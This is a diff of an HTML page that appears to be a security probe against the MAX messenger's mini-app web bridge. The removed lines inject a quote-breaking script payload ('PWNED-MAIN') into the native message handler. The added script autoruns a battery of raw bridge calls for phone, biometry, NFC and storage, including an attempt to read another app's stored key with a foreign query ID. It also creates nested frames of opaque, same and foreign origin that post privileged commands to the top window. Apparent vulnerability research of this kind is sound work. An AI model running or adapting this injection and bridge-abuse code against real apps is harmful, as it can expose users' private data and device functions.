@@ -1,39 +1,213 @@
 <!doctype html>
 <html lang="ru">
-<head><meta charset="utf-8"><title>T</title>
-<style>body{font:15px monospace;margin:12px}
-button{width:100%;padding:16px;font:inherit;font-size:17px;font-weight:bold;background:#ffd;border:2px solid #a80;border-radius:8px;cursor:pointer;margin-top:10px}
-#log{white-space:pre-wrap;background:#111;color:#9f9;padding:10px;margin-top:10px;border-radius:4px;max-height:320px;overflow:auto}</style>
+<head><meta charset="utf-8"><title>R17WEB</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body{font:14px monospace;margin:10px;background:#fff}
+button{width:100%;padding:14px;font:inherit;font-size:16px;font-weight:bold;background:#ffd;border:2px solid #a80;border-radius:8px;cursor:pointer;margin-top:8px}
+#log{white-space:pre-wrap;background:#111;color:#9f9;padding:10px;margin-top:10px;border-radius:4px;max-height:400px;overflow:auto;word-break:break-all}
+#hdr{font-weight:bold}
+iframe.nested{width:100%;height:110px;border:2px dashed #48a;margin-top:8px;background:#eef}
+</style>
 </head>
 <body>
-<div>Жди 4 сек (тест пойдёт сам), потом скопируй лог и жми кнопку внизу.</div>
-<div id="log">ready</div>
-<button id="next">ДАЛЕЕ — на чужую страницу (там нажми Accept в диалоге телефона)</button>
+<div id="hdr">R17 web-bridge probe</div>
+<div id="log">boot</div>
+<button id="b-phone">RequestPhone (модалка)</button>
+<button id="b-dl">DownloadFile (модалка)</button>
+<button id="b-bb">BackButton on → off (4с)</button>
+<button id="b-closeconf">ClosingConfirmation on</button>
+<button id="b-n1">N1: opaque-origin вложенный фрейм</button>
+<button id="b-n2">N2: same-origin вложенный фрейм</button>
+<button id="b-n3">N3: чужой origin (jsdelivr)</button>
+<button id="b-openlink">OpenLink example.com</button>
+<button id="b-openmax">OpenMaxLink max.ru (последний)</button>
 <script src="https://st.max.ru/js/max-web-app.js"></script>
-<script>(() => {
-const RUN=(crypto.randomUUID?crypto.randomUUID().slice(0,8):Math.random().toString(36).slice(2,10));
-const logEl=document.getElementById('log');
-function log(...a){ logEl.textContent += "\n["+new Date().toTimeString().slice(0,8)+"] "+a.map(x=>String(x)).join(" "); }
-log("run:",RUN);
-function ensureRecv(){
-  if(!window.WebApp) window.WebApp={};
-  if(typeof window.WebApp.sendEvent!=='function' || window.WebApp.__ours){ 
-    window.WebApp.sendEvent=function(n,d){ log("<=",n,d); if(window.__deliver) window.__deliver(n,d); };
-    window.WebApp.__ours=1;
-  }
+<script>
+"use strict";
+(function(){
+var RUN = (crypto.randomUUID ? crypto.randomUUID().slice(0,8) : String(Math.random()).slice(2,10));
+var logEl = document.getElementById('log');
+function log(){
+  var line = '[' + new Date().toTimeString().slice(0,8) + '] ' + Array.prototype.map.call(arguments, function(x){ return (typeof x === 'object' && x !== null) ? JSON.stringify(x) : String(x); }).join(' ');
+  logEl.textContent += '\n' + line;
+  logEl.scrollTop = logEl.scrollHeight;
+  console.log('[R17:'+RUN+']', Array.prototype.join.call(arguments, ' '));
 }
-ensureRecv();
-const t=setInterval(()=>{ if(window.WebApp && !window.WebApp.__ours && typeof WebApp.sendEvent==='function'){
-  const o=WebApp.sendEvent.bind(WebApp);
-  WebApp.sendEvent=function(n,d){ log("<=",n,d); return o(n,d); }; WebApp.__ours=1; clearInterval(t); } },200);
-setTimeout(()=>{
-  log("=> self-test: raw GetKey с breakout-payload из ГЛАВНОГО фрейма");
-  try{ window.webkit.messageHandlers.EventHandler.postMessage('WebAppDeviceStorageGetKey:'+JSON.stringify({requestId:');document.title="PWNED-MAIN";window.__pwn=1;//',key:'k'+RUN})); }
-  catch(e){ log("throw:",e.message); }
-  setTimeout(()=>log("self-test: title=",document.title,"__pwn=",window.__pwn),2500);
-},2000);
-let lastTitle=document.title;
-setInterval(()=>{ if(document.title!==lastTitle){ lastTitle=document.title; log("TITLE:",lastTitle); } },300);
-document.getElementById('next').onclick=()=>setTimeout(()=>{ location.href='https://cdn.jsdelivr.net/gh/nbafan00/dl-check@1d9c5ac9bcf3d18fe3f983b9b3af20e1bdda8c13/child.xhtml'; },300);
-})();</script>
+function title(s){ document.title = 'R17 ' + s; }
+
+function rawPost(type, obj){
+  var msg = JSON.stringify(Object.assign({type: type}, obj || {}));
+  try { window.parent.postMessage(msg, '*'); log('=> raw', type, JSON.stringify(obj || {})); }
+  catch(e){ log('!! raw fail', type, e.message); }
+}
+
+var seen = Object.create(null);
+window.addEventListener('message', function(e){
+  var d = e.data;
+  if (typeof d !== 'string' || d === '') return;
+  var j = null; try { j = JSON.parse(d); } catch(_) { log('<= non-JSON from', e.origin, String(d).slice(0,120)); return; }
+  if (!j || !j.type) return;
+  if (j.requestId){ if (seen[j.requestId]) return; seen[j.requestId] = 1; }
+  log('<=', j.type, String(d).slice(0, 400), 'origin=' + e.origin);
+});
+
+function env(){
+  var h = new URLSearchParams(location.hash.slice(1));
+  var plat = h.get('WebAppPlatform') || (window.WebApp && WebApp.platform) || '?';
+  var idu = (window.WebApp && WebApp.initDataUnsafe) || {};
+  log('ENV run=' + RUN + ' platform=' + plat + ' version=' + (h.get('WebAppVersion') || (window.WebApp && WebApp.version)) + ' start_param=' + (idu.start_param || '-') + ' query_id=' + (idu.query_id || '-') + ' initDataKeys=' + Object.keys(idu).join(','));
+  log('ENV href=' + location.href.slice(0, 300));
+  return plat;
+}
+
+function sdkCall(name, p, timeoutMs){
+  var t0 = Date.now();
+  var to = setTimeout(function(){ log('sdk ' + name + ': PENDING >' + (Date.now()-t0) + 'ms (нет ответа)'); }, timeoutMs || 4000);
+  try {
+    Promise.resolve(p).then(function(v){ clearTimeout(to); log('sdk ' + name + ' OK:', JSON.stringify(v)); },
+      function(err){ clearTimeout(to); log('sdk ' + name + ' ERR:', JSON.stringify(err)); });
+  } catch(e){ clearTimeout(to); log('sdk ' + name + ' THROW:', e.message); }
+}
+
+var QID = '';
+function inventory(){
+  var idu = (window.WebApp && WebApp.initDataUnsafe) || {};
+  QID = idu.query_id || '';
+  var evts = [
+    ['WebAppNfcGetInfo', {}],
+    ['WebAppNfcOpenSystemSettings', {}],
+    ['WebAppNfcEmulateNfcTag', {nfctag:{id:'r17',type:'text',text:'r17'}}],
+    ['WebAppBiometryGetInfo', {}],
+    ['WebAppBiometryRequestAccess', {reason:'r17-test'}],
+    ['WebAppBiometryRequestAuth', {reason:'r17-test'}],
+    ['WebAppBiometryUpdateToken', {token:'r17-tok', reason:'r17-test'}],
+    ['WebAppBiometryOpenSettings', {}],
+    ['WebAppDeviceStorageSaveKey', {key:'r17-dev-'+RUN, value:'V17-'+RUN}],
+    ['WebAppDeviceStorageSaveKey+qid', {key:'r17-devq-'+RUN, value:'V17-'+RUN, queryId:QID}],
+    ['WebAppDeviceStorageGetKey', {key:'r17-dev-'+RUN}],
+    ['WebAppDeviceStorageGetKey+qid', {key:'r17-devq-'+RUN, queryId:QID}],
+    ['WebAppDeviceStorageGetKey+foreignqid', {key:'probe-secret-shared', queryId:'00000000-0000-0000-0000-000000000000'}],
+    ['WebAppDeviceStorageClear', {}],
+    ['WebAppSecureStorageSaveKey', {key:'r17-sec-'+RUN, value:'S17-'+RUN, queryId:QID}],
+    ['WebAppSecureStorageGetKey', {key:'r17-sec-'+RUN, queryId:QID}],
+    ['WebAppSecureStorageClear', {}],
+    ['WebAppHapticFeedbackImpact', {style:'medium'}],
+    ['WebAppOrientationLock', {orientation:'portrait', queryId:QID}],
+    ['WebAppGetViewportSize', {}],
+    ['WebAppChangeScreenBrightness', {brightness:1}],
+    ['WebAppGetLaunchContext', {}],
+    ['WebAppOpenCodeReader', {fileSelect:false}],
+    ['WebAppSetupScreenCaptureBehavior', {isEnabled:true}],
+    ['WebAppSetupSwipesBehavior', {verticalSwipesEnabled:true}],
+    ['WebAppShare', {text:'r17', link:'https://example.com/'}],
+    ['WebAppTotallyUnknown', {foo:1}]
+  ];
+  var i = 0;
+  var iv = setInterval(function(){
+    if (i >= evts.length){ clearInterval(iv); log('INVENTORY DONE (' + evts.length + ')'); title('inv-done'); return; }
+    var e = evts[i++]; rawPost(e[0], e[1]);
+  }, 700);
+}
+
+function sdkBattery(){
+  try {
+    sdkCall('NfcManager.init()', WebApp.NfcManager.init(), 4500);
+    setTimeout(function(){ sdkCall('BiometricManager.init()', WebApp.BiometricManager.init(), 4500); }, 1200);
+    setTimeout(function(){ sdkCall('BiometricManager.authenticate', WebApp.BiometricManager.authenticate('r17'), 4500); }, 2400);
+    setTimeout(function(){ sdkCall('DeviceStorage.setItem', WebApp.DeviceStorage.setItem('r17-sdk-'+RUN, 'SDKV17-'+RUN), 4500); }, 3600);
+    setTimeout(function(){ sdkCall('DeviceStorage.getItem', WebApp.DeviceStorage.getItem('r17-sdk-'+RUN), 4500); }, 4800);
+    setTimeout(function(){ sdkCall('SecureStorage.setItem', WebApp.SecureStorage.setItem('r17-sdksec-'+RUN, 'SECV17-'+RUN), 4500); }, 6000);
+    setTimeout(function(){ sdkCall('shareContent', WebApp.shareContent({text:'r17'}), 4500); }, 7200);
+    setTimeout(function(){ log('SDK BATTERY DONE'); }, 8500);
+  } catch(e){ log('sdk battery THROW', e.message); }
+}
+
+var nested = null;
+function makeNested(kind){
+  if (nested){ nested.remove(); nested = null; }
+  nested = document.createElement('iframe');
+  nested.className = 'nested';
+  if (kind === 'opaque'){
+    nested.setAttribute('sandbox', 'allow-scripts');
+    nested.srcdoc = '<!doctype html><script>var R="op-"+Math.random().toString(36).slice(2,8);' +
+      'function L(m){console.log("[R17NESTED:"+R+"]",m);document.body.innerHTML+="<div>"+m+"</div>";}' +
+      'window.addEventListener("message",function(e){L("<= REPLY "+e.origin+" "+String(e.data).slice(0,200));});' +
+      'L("opaque frame origin="+location.origin);' +
+      'setTimeout(function(){var m=JSON.stringify({type:"WebAppShare",requestId:"r17-n1-share-"+R});' +
+      'try{window.parent.parent.postMessage(m,"*");L("=> posted WebAppShare to top");}catch(e){L("post fail "+e.message);}},600);' +
+      'setTimeout(function(){var m2=JSON.stringify({type:"WebAppSetupBackButton",isVisible:true});' +
+      'try{window.parent.parent.postMessage(m2,"*");L("=> posted SetupBackButton to top");}catch(e){}},1200);' +
+      '<\/script>';
+    log('N1: создан opaque-origin фрейм (sandbox=allow-scripts, без allow-same-origin)');
+  } else if (kind === 'same'){
+    nested.srcdoc = '<!doctype html><script>var R="so-"+Math.random().toString(36).slice(2,8);' +
+      'function L(m){console.log("[R17NESTED:"+R+"]",m);document.body.innerHTML+="<div>"+m+"</div>";}' +
+      'window.addEventListener("message",function(e){L("<= REPLY "+e.origin+" "+String(e.data).slice(0,200));});' +
+      'L("same-origin frame origin="+location.origin);' +
+      'setTimeout(function(){var m=JSON.stringify({type:"WebAppShare",requestId:"r17-n2-share-"+R});' +
+      'try{window.parent.parent.postMessage(m,"*");L("=> posted WebAppShare to top");}catch(e){L("post fail "+e.message);}},600);' +
+      'setTimeout(function(){var m2=JSON.stringify({type:"WebAppGetViewportSize",requestId:"r17-n2-vp-"+R});' +
+      'try{window.parent.parent.postMessage(m2,"*");L("=> posted GetViewportSize to top");}catch(e){}},1200);' +
+      '<\/script>';
+    log('N2: создан SAME-ORIGIN фрейм (srcdoc, без sandbox)');
+  } else if (kind === 'foreign'){
+    nested.src = 'https://cdn.jsdelivr.net/gh/nbafan00/dl-check@c50a44cf6c92bc8eca84b9e1358163b7e4403018/child-r17.html';
+    log('N3: создан ЧУЖОЙ origin фрейм (jsdelivr)');
+  }
+  document.body.appendChild(nested);
+}
+
+var tests = {
+  env: env,
+  phone: function(){ rawPost('WebAppRequestPhone', {requestId:'r17-phone-'+RUN}); },
+  dl: function(){ rawPost('WebAppDownloadFile', {url:'https://nbafan00.github.io/dl-check/probe.txt', file_name:'r17-web-probe.txt', requestId:'r17-dl-'+RUN}); },
+  dl_bad: function(){ rawPost('WebAppDownloadFile', {url:'http://nbafan00.github.io/dl-check/probe.txt', file_name:'x.txt', requestId:'r17-dlbad-'+RUN}); },
+  bb_on: function(){ rawPost('WebAppSetupBackButton', {isVisible:true}); },
+  bb_off: function(){ rawPost('WebAppSetupBackButton', {isVisible:false}); },
+  closeconf: function(){ rawPost('WebAppSetupClosingBehavior', {needConfirmation:true}); },
+  closeconf_off: function(){ rawPost('WebAppSetupClosingBehavior', {needConfirmation:false}); },
+  n1: function(){ makeNested('opaque'); },
+  n2: function(){ makeNested('same'); },
+  n3: function(){ makeNested('foreign'); },
+  openlink: function(){ rawPost('WebAppOpenLink', {url:'https://example.com/r17-openlink'}); },
+  openlink_int: function(){ rawPost('WebAppOpenLink', {url:'https://max.ru/legal'}); },
+  openmax: function(){ rawPost('WebAppOpenMaxLink', {url:'https://max.ru/legal'}); },
+  openmax_ext: function(){ rawPost('WebAppOpenMaxLink', {url:'https://example.com/r17'}); },
+  inv: inventory,
+  sdk: sdkBattery,
+  storage_q: function(){
+    var idu = (window.WebApp && WebApp.initDataUnsafe) || {};
+    log('storage_q: query_id=' + (idu.query_id || '-'));
+    rawPost('WebAppDeviceStorageGetKey', {key:'r17-dev-'+RUN, queryId:idu.query_id || ''});
+    rawPost('WebAppDeviceStorageGetKey', {key:'r17-devq-'+RUN});
+  }
+};
+[['phone','b-phone'],['dl','b-dl'],['closeconf','b-closeconf'],['n1','b-n1'],['n2','b-n2'],['n3','b-n3'],['openlink','b-openlink'],['openmax','b-openmax']].forEach(function(p){
+  var b = document.getElementById(p[1]);
+  if (b) b.onclick = function(){ log('BTN', p[0]); tests[p[0]](); };
+});
+document.getElementById('b-bb').onclick = function(){ log('BTN bb_on'); tests.bb_on(); setTimeout(function(){ log('BTN bb_off'); tests.bb_off(); }, 4000); };
+
+window.addEventListener('message', function(e){
+  if (e.origin !== 'https://web.max.ru') return;
+  var j = null; try { j = JSON.parse(e.data); } catch(_) { return; }
+  if (j && j.r17cmd && tests[j.r17cmd]){ log('CMD', j.r17cmd); tests[j.r17cmd](); }
+});
+
+var plat = env();
+if (plat === 'web'){
+  log('autorun: платформа web — инвентаризация через 2 с (остальное по командам/кнопкам)');
+  setTimeout(function(){ inventory(); }, 2000);
+  setTimeout(function(){ sdkBattery(); }, 26000);
+  setTimeout(function(){ makeNested('opaque'); }, 40000);
+  setTimeout(function(){ makeNested('same'); }, 47000);
+  setTimeout(function(){ makeNested('foreign'); }, 54000);
+  setTimeout(function(){ log('AUTORUN PHASE DONE'); title('auto-done'); }, 62000);
+} else {
+  log('платформа НЕ web (' + plat + ') — только ручные кнопки');
+}
+title('loaded');
+})();
+</script>
 </body></html>
